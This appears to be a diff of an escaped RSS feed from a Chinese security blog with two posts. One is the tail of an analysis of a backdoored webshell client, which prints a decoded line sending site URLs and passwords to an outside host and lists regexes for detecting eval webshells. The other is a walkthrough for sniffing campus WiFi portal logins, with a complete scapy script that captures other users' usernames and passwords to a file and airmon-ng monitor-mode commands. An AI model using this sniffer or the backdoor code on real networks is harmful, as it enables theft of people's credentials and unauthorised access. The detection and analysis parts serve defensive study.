+ $R;;echo(&amp;#34;|&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;die&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;将中间base64加密字段进行第二次解密：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;if($_COOKIE[&amp;#39;Lyke&amp;#39;]!=1){setcookie(&amp;#39;Lyke&amp;#39;,1);@file(&amp;#39;http://www.api.com.de/Api.php?Url=&amp;#39;.$_SERVER[&amp;#39;HTTP_HOST&amp;#39;].$_SERVER[&amp;#39;REQUEST_URI&amp;#39;].&amp;#39;&amp;amp;Pass=&amp;#39;.key($_POST));}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可以看到这个菜刀明显存在后门。&lt;/p&gt;
+&lt;p&gt;另外，在X-Forwarded-For这里是值得怀疑的地方，因为这里的IP是别的地方的，网上还没找到关于这种情况是不是后门的相关内容。这个地方大家可以研究一下，个人觉得是比较隐蔽的后门吧，但是问题是我所用的几个版本的菜刀在X-Forwarded-For这里都是有这个别的地方的IP的。&lt;/p&gt;
+&lt;h2 id=&#34;0x04-linuxwindows下查找菜刀一句话木马&#34;&gt;0x04 Linux、Windows下查找菜刀一句话木马&lt;/h2&gt;
+&lt;p&gt;Linux：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;使用egrep命令进行正则匹配&lt;/li&gt;
+&lt;li&gt;egrep -re &#39; &amp;lt;php\s@eval[(]$&lt;em&gt;POST[.+][)];?&amp;rsquo; *.php&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Windows：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;通过findstr命令加上正则表达式搜索文件&lt;/li&gt;
+&lt;li&gt;findstr /R &amp;ldquo;&amp;lt;php.@eval[(]$_POST.*[)];?&amp;rdquo; *.php&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;若是asp一句话木马，则需要修改正则表达式即可：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;egrep -re &amp;lsquo;[[]%@\sPage\sLanguage=.Jscript.%[](mailto:]/%/@/sPage/sLanguage=.Jscript./%[)][&amp;lt;]%eval.Request.Item.+unsafe&amp;rsquo; *.aspx&lt;/li&gt;
+&lt;li&gt;findstr /R &amp;ldquo;[[]%@.Page.Language=.Jscript.%[](mailto:]/%/@.Page.Language=.Jscript./%[)][&amp;lt;]%eval.Request.Item.*unsafe&amp;rdquo; *.aspx&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;0x05-其他脚本后门分析&#34;&gt;0x05 其他脚本后门分析&lt;/h2&gt;
+&lt;p&gt;一般的方法就是，通过Firefox的F12即开发者工具到Network网络查看，如果在URL下还有访问其它网页的信息，那么基本就是存在后门。&lt;/p&gt;
+&lt;h2 id=&#34;0x06-手动查找后门木马&#34;&gt;0x06 手动查找后门木马&lt;/h2&gt;
+&lt;p&gt;1、系统的启动项，在运行输入msconfig，在打开的系统配置实用程序里的启动列表查看，并且服务也要注意一下，可以使用360安全卫士等软件的开机加速功能，来查看有无异常的可以启动项和服务项，因为在后门木马中99%都会注册自己为系统服务，达到开机自启动的目的，如果发现可疑项直接打开相应的路径，找到程序文件，直接删除并且禁止自启动；&lt;/p&gt;
+&lt;p&gt;2、查看系统关键目录system32和系统安装目录Windows下的文件。然后查看最新修改的文件中有没有可疑的可执行文件或dll文件，这两个地方都是木马最喜欢的藏身的地方了（记得先设置显示所有的文件和文件夹）；&lt;/p&gt;
+&lt;p&gt;3、观察网络连接是否存在异常，还有输入netstat -ano命令查看有没有可疑或非正常程序的网络连接，尤其注意一下远程连接的端口，如果有类似于8000等端口就要注意了，8000是灰鸽子的默认端口。&lt;/p&gt;
+&lt;p&gt;这里重点讲一下第三点：&lt;/p&gt;
+&lt;p&gt;1、 查看进程：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;netstat-an
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;netstat -ano 多显示一个PID，先查看established的进程中所连接的外部地址是否是一个可疑的、没见过的地址，如果本身主机没有进行什么网络访问的话就需要警惕了，先记住这个可疑进程的PID。&lt;/p&gt;
+&lt;p&gt;tasklist /svc，输入这个命令，通过对应的PID找到对应的进程名。&lt;/p&gt;
+&lt;p&gt;2、 查看服务：&lt;/p&gt;
+&lt;p&gt;可以使用工具XueTr来进行更为简便的操作，使用其查看服务和进程等信息（注意的一点，微软服务的描述在最后都是由句号的，而第三方的服务是没有的）&lt;/p&gt;
+&lt;p&gt;先右键到dll文件的路径中将dll文件删除，然后到相应的服务中将其删除掉，最后将可疑进程终止掉。&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>H3C校园网WIFI密码嗅探</title>
+      <link>https://p0st3r.github.io/post/h3c-wifi-sniff/</link>
+      <pubDate>Tue, 09 May 2017 00:00:00 +0000</pubDate>
+      <guid>https://p0st3r.github.io/post/h3c-wifi-sniff/</guid>
+      <description>&lt;h1 id=&#34;初步分析认证交互&#34;&gt;初步分析认证交互&lt;/h1&gt;
+&lt;p&gt;该校校园网WIFI采用H3C认证，认证地址为内网某服务器上。url为
+&lt;a href=&#34;http://link.zhihu.com/?target=http%3A//192.168.150.2%3A8080/portal/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;http://192.168.xxx.x:xxxx/portal/index_default.jsp&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;查看dom&#34;&gt;查看DOM&lt;/h2&gt;
+&lt;p&gt;发现了几个重要的函数。base64()、checkUserName()、encrypt()&lt;/p&gt;
+&lt;p&gt;base64是将输入的文本进行一次base64编码，checkUerName就是检查用户名，encrypt是将密码再进行一次加密。&lt;/p&gt;
+&lt;p&gt;base64是将输入的文本进行一次base64编码，checkUerName就是检查用户名，encrypt是将密码再进行一次加密。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;./v2-eec5275988a740dd98ee624e443ab1a8_hd.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;分析网络流&#34;&gt;分析网络流&lt;/h2&gt;
+&lt;p&gt;首先使用火狐的firebug+检查元素来分析网络流。&lt;/p&gt;
+&lt;p&gt;当我们访问登陆页面时，发送GET请求并带一个i_p_pl的cookie&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;./v2-bf33b3c1543ec099f360573a6ac00aaf_hd.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;尝试登陆，登陆成功跳转到
+&lt;a href=&#34;http://link.zhihu.com/?target=http%3A//192.168.xxx.x%3Axxxx/portal/succese.jsp&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;http://192.168.xxx.x:xxxx/portal/page/loginSucc.jsp**&lt;/a&gt;，发送了*个GET请求，除去图片和脚本，此次登陆只向/portal/loginSucc.jsp发送了GET包，除了i_p_pl，还带有hello1、hello2两个个cookie，其中hello1为登陆发送的username，hello2暂不明其含义。&lt;/p&gt;
+&lt;p&gt;在后来的测试中，发现hello2是【记住登陆】功能的参数，当hello2=false时不记住，hello2=true时记住并附带hello3、hello4、hello5参数，本来应当是可以利用这些cookie来绕过登陆直接请求认证的，不过考虑到其又要增加工作量，因此先放一边。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;./v2-279ce765f1d931475fb7997c43b8a7bf_hd.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这就很奇怪了，在整个登陆过程全部都是GET请求而没有POST请求，没有POST请求是怎么把用户名密码传输上去认证的呢？况且之前已经在DOM中发现了base64encode()和query()函数。难道用户名和密码是在GET时Cookie中传上去的？。虽然不用想就知道GET发送cookie来登陆很扯，但还是要研究一下cookie的含义。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;./v2-bcc5e9f15b77dec561a603ca8f063bc2_hd.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;探究cookie含义&#34;&gt;探究cookie含义&lt;/h2&gt;
+&lt;p&gt;登陆时发送的i_p_pl&lt;/p&gt;
+&lt;p&gt;i_p_pl=JTdCJTIyZXJyb3JOdW1iZXIlMjIlM0ElMjIxJTIyJTJDJTIybmV4dFVybCUyMiUzQSUyMmh0dHAlM0ElMkYlMkYxOTIuMTY4LjE1MC4yJTNBODA4MCUyRnBvcnRhbCUyRmluZGV4X2RlZmF1bHQuanNwJTIyJTJDJTIycXVpY2tBdXRoJTIyJTNBZmFsc2UlMkMlMjJjbGllbnRMYW5ndWFnZSUyMiUzQSUyMkNoaW5lc2UlMjIlMkMlMjJhc3NpZ25JcFR5cGUlMjIlM0EwJTJDJTIyaU5vZGVQd2ROZWVkRW5jcnlwdCUyMiUzQTElMkMlMjJ3bGFubmFzaWQlMjIlM0ElMjIlMjIlMkMlMjJ3bGFuc3NpZCUyMiUzQSUyMiUyMiUyQyUyMm5hc0lwJTIyJTNBJTIyJTIyJTJDJTIyYnlvZFNlcnZlcklwJTIyJTNBJTIyMC4wLjAuMCUyMiUyQyUyMmJ5b2RTZXJ2ZXJJcHY2JTIyJTNBJTIyMDAwMCUzQTAwMDAlM0EwMDAwJTNBMDAwMCUzQTAwMDAlM0EwMDAwJTNBMDAwMCUzQTAwMDAlMjIlMkMlMjJieW9kU2VydmVySHR0cFBvcnQlMjIlM0ElMjI4MDgwJTIyJTJDJTIyaWZUcnlVc2VQb3B1cFdpbmRvdyUyMiUzQWZhbHNlJTJDJTIydWFtSW5pdEN1c3RvbSUyMiUzQSUyMjElMjIlMkMlMjJjdXN0b21DZmclMjIlM0ElMjJNUSUyMiUyQyUyMnJlZ0NvZGVUeXBlJTIyJTNBJTIyTUElMjIlN0Q&lt;/p&gt;
+&lt;p&gt;很明显这是一个base64编码过的字符串，把这个base64解码再url解码，就得到了&lt;/p&gt;
+&lt;p&gt;{“errorNumber”:”1”,”nextUrl”:”
+&lt;a href=&#34;http://link.zhihu.com/?target=http%3A//192.168.150.2%3A8080/portal/index_default.jsp&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;http://192.168.xxx.x:xxxx/portal/index_default.jsp**&lt;/a&gt;“,”quickAuth”:false,”clientLanguage”:”Chinese”,”assignIpType”:0,”iNodePwdNeedEncrypt”:1,”wlannasid”:””,”wlanssid”:””,”nasIp”:””,”byodServerIp”:”0.0.0.0”,”byodServerIpv6”:”0000:0000:0000:0000:0000:0000:0000:0000”,”byodServerHttpPort”:”8080”,”ifTryUsePopupWindow”:false,”uamInitCustom”:”1”,”customCfg”:”MQ”,”regCodeType”:”MA”}&lt;/p&gt;
+&lt;p&gt;这只是向无线路由器发送的表明自己身份的未完成的表单，没有我们要的用户名和密码。&lt;/p&gt;
+&lt;h1 id=&#34;完整认证过程&#34;&gt;完整认证过程&lt;/h1&gt;
+&lt;p&gt;只有GET请求果然很扯，这很有可能是我们的浏览器网络流分析工具有些问题，或者该Web认证的安全性足够好，导致我们无法截取完整的请求流。&lt;/p&gt;
+&lt;p&gt;这样就只有用Wireshark来对网卡进行完全的监听，以抓取全部流量包。&lt;/p&gt;
+&lt;p&gt;设置Capture interface为 WLAN 无线网卡，开启抓取后重现登陆过程。&lt;/p&gt;
+&lt;p&gt;抓到的流量包除了访问该认证网站的http流，还包括了所有经过该无线网卡的所有协议的网络流。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;./v2-6cd8906aa2f5a6d610aefc4c269c322f_hd.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;设置过滤规则为http协议并且只有该认证网址ip。&lt;/p&gt;
+&lt;p&gt;发现登录一次h3c系统，要先后传参给3个页面，一个/pws？t=li，一个/afterlogin.jsp,一个/loginSucc.jsp，所以就分别看这几个网页的抓包数据。&lt;/p&gt;
+&lt;p&gt;发现其cookie都是一样的，但是只有pws这个页面是POST请求。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;./v2-1d86af749bc5c0d02e757e52e08d791f_hd.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;查看pws应用层传输的数据，发现上传了【userName】和【userPwd】参数，也就是说，只有这个页面是验证密码的。&lt;/p&gt;
+&lt;p&gt;【userName】就是登陆的用户名，【userPwd】是经过base64编码后的密码。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;./v2-630128ad034d028c51c867078cbc1530_hd.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;总结思路&#34;&gt;总结思路&lt;/h1&gt;
+&lt;p&gt;我们可以抓取用户登陆时的POST请求来获取用户名和密码，也可以在用户勾选【记住密码】时获取带有用户名密码信息的cookie。&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;当抓到client ==&amp;gt; server的数据包时&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;如果是GET请求，检查有没有Cookie存在。&lt;/li&gt;
+&lt;li&gt;如果是POST请求，把用户名和密码拿出来。&lt;/li&gt;
+&lt;li&gt;检查是否有set-cookie头部，有的话取出来。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;最后如果有cookie被嗅探到，就带着cookie把向server索要一下密码。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;但是为了偷懒，这里就不嗅探cookie了，直接嗅探POST的用户名和密码就行了。最终思路如下：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;当抓到client ==&amp;gt; server的数据包时，如果是POST请求，直接把用户名和密码拿出来。&lt;/p&gt;
+&lt;h1 id=&#34;嗅探&#34;&gt;嗅探&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;实验环境&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Ubuntu虚拟机&lt;/li&gt;
+&lt;li&gt;大功率USB无线网卡（8187等）&lt;/li&gt;
+&lt;li&gt;python2.7&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;python扩展库需要&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;requests&lt;/li&gt;
+&lt;li&gt;scapy&lt;/li&gt;
+&lt;li&gt;scapy_http&lt;/li&gt;
+&lt;li&gt;lxml&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;** 代码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; requests
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; scapy_http.http &lt;span style=&#34;color:#f92672&#34;&gt;as&lt;/span&gt; http
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; scapy.all &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; lxml &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; etree
+iface &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;wlan0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
+url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;http://192.168.xxx.x:xxxx/portal/pws?t=li&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+path &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/root&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;prn&lt;/span&gt;(pkt):
+    data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; None
+    &lt;span style=&#34;color:#75715e&#34;&gt;#std ==&amp;gt; ap    &lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; pkt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;haslayer(http&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;HTTPRequest):
+        &lt;span style=&#34;color:#75715e&#34;&gt;#if post the username and password&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; pkt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Method &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;POST&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;userName&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; pkt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load:            
+            dt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {i&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]:i&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; pkt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)}        
+            data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:::&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join((dt[&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;userName&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;],dt[&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;userPwd&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;:]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;base64&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;))) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;        
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[+]Get! Post data:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;(dt[&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;userName&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;],dt[&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;userPwd&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;])    
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; data &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; None:
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(path &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;schoolUserPwd.txt&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;a&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; txt:    
+                    txt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(data)
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;():    
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:        
+        sniff(iface&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;iface, prn&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;prn, filter&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ip host 192.168.xxx.x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, store&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)    
+        &lt;span style=&#34;color:#75715e&#34;&gt;#sniff(offline=path + &amp;#34;school.pcap&amp;#34;, prn=prn, filter=&amp;#34;ip host 192.168.xxx.x&amp;#34;)    &lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;KeyboardInterrupt&lt;/span&gt;, e:        
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;quitting...&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;__main__&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;:    
+    main()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;说明&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;requests用来向服务器请求&lt;/li&gt;
+&lt;li&gt;scapy用来在无线网络中嗅探&lt;/li&gt;
+&lt;li&gt;scapy_http用来对http协议更方便的解析&lt;/li&gt;
+&lt;li&gt;lxml用来从服务器返回的html文件中，解析出来用户名和密码&lt;/li&gt;
+&lt;li&gt;prn是sniff函数每过滤到一个符合条件的数据包时回调的函数，并将数据包本身作为参数传入&lt;/li&gt;
+&lt;li&gt;之所以选择Ubuntu而不是Windows是因为scapy_http在win下运行有些问题&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;由于我们既要嗅探，同时又要向服务器请求，所以airmon-ng check kill后，无线网卡开启monitor模式，再将网卡调到信号最强的ap的信道上。之前经过kismet抓取无线网包发现该校园网WIFI是在channel 1/6/11信道上工作的。&lt;/p&gt;
+&lt;p&gt;最后再打开网络管理的服务。&lt;/p&gt;
+&lt;p&gt;执行以下命令&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$sudo airmon-ng check kill
+$sudo ifconfig wlan0 down
+$sudo iwconfig wlan0 mode monitor
+$sudo ifconfig wlan0 up
+$sudo iwconfig mon0 channel 1/6/11
+$sudo service network-manager start
